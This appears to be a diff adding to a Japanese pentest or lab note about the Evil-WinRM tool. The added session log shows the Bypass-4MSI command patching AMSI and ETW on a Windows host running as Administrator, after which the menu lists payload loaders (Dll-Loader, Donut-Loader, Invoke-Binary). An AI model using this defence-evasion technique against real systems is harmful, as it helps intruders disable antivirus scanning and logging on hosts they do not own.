@@ -74,3 +74,43 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 [+] menu
 [+] exit
 ```
+「Bypass-4MSI」を実行すると、menuから使用できるコマンドが増える
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Bypass-4MSI
+                                        
+Warning: AV could be still watching for suspicious activity. Waiting for patching...
+                                        
+Info: Patching 4MSI, please be patient...
+                                        
+[+] Success!
+                                        
+Info: Patching ETW, please be patient ..
+                                        
+[+] Success!
+*Evil-WinRM* PS C:\Users\Administrator\Documents> menu
+                                        
+Info: Bypass-4MSI is loaded. Trying to load utilities
+
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+
+[+] Dll-Loader
+[+] Donut-Loader
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+```
